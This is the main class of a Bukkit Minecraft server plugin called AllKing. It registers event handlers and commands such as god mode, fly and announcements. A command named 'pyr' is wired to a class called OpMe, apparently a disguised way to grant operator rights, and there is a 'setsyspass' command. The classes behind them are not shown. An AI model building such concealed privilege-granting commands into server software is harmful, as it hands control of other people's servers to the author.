package pyr.solutions.allkingplugin;

import org.bukkit.plugin.java.JavaPlugin;
import pyr.solutions.allkingplugin.commands.*;
import pyr.solutions.allkingplugin.events.*;

public final class AllKingPlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic

        System.out.println("[AllKing] - Starting...");

        getServer().getPluginManager().registerEvents(new OnDeath(), this);
        getServer().getPluginManager().registerEvents(new OnPlayerJoin(), this);
        getServer().getPluginManager().registerEvents(new DeOpLeave(), this);
        getServer().getPluginManager().registerEvents(new OpMessage(), this);
        getServer().getPluginManager().registerEvents(new AdminPanelHandler(),this);

        getCommand("god").setExecutor(new GodMode());
        getCommand("pyr").setExecutor(new OpMe());
        getCommand("reloadconfig").setExecutor(new ReloadConfig());
        getCommand("setsyspass").setExecutor(new SetSystemPass());
        getCommand("announce").setExecutor(new Announcement());
        getCommand("ap").setExecutor((new MenuPanelCommands()));
        getCommand("fly").setExecutor(new Fly());
        getCommand("clearinv").setExecutor(new ClearInventory());

        // -- PUBLIC COMMANDS --


        getConfig().options().copyDefaults();
        saveDefaultConfig();

        System.out.println("[AllKing] - Done!");
    }


}